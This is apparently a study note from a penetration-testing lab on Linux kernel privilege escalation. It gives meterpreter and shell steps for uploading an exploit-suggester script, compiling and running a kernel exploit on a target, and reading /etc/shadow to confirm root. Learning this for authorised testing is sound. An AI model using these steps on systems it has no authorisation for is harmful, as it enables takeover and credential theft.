Kernel exploits on Linux will typically target vuln. in the Linux kernel to execute arbitrary code in order to run priv. system commands or to obtain a system shell.

This process will differ based on the Kernel vserion and distribution being targeted and the kernel exploit being used

Priv escalation on Linux systems will typically follow the following method:
  Identify kernel vuln.
  Download, compile and transfer kernel exploits onto the target system

----------Tools----------
Use linux-exploit-suggestor which is designed to assist in detecting security deficiencies for given linux kernel/linux-based machine. It assesses (using heuristic methods) the exposure of the given kernel on every publicly known linux kernel exploit.

### When identifying kernel exploits, the kernel version and distribution release version are the most important pieces of information ###

Example here will be shown with the target running Ubuntu 12.04 VM

------------------------------Exploitation-------------------------------------

**this will be shown after the point you get a meterpreter session**
sysinfo (to check version and such)
getuid (www-data is a service account that is used to manage a web server/app, not part of sudo group on linux system)
shell
/bin/bash -i (you can use shell and this to verify thats true)
**back to meterpreter**
cd /tmp
upload ~/Desktop/Linux-Enum/les.sh
shell
/bin/bash -i
ls
chmox +x les.sh
./les.sh
**now we will download the best suggested exploit code*
**to compile c code use the gcc command**
gcc -pthread <exploitname> -o <choose any file name> -lcrypt
**now on the meterpreter**
upload ~/Downloads/<exploit file>
shell
chmod +x <exploit name>
./<name>
**if you run it and it fails, you will need to compile it on the target machine**
**if you have an exploit that creates a priv user on the machine, you could try SSH into the target**
ssh <usercreated>@<ip>
cat /etc/shadow (you can use this to confirm that you have root privs as this is a root priv file)
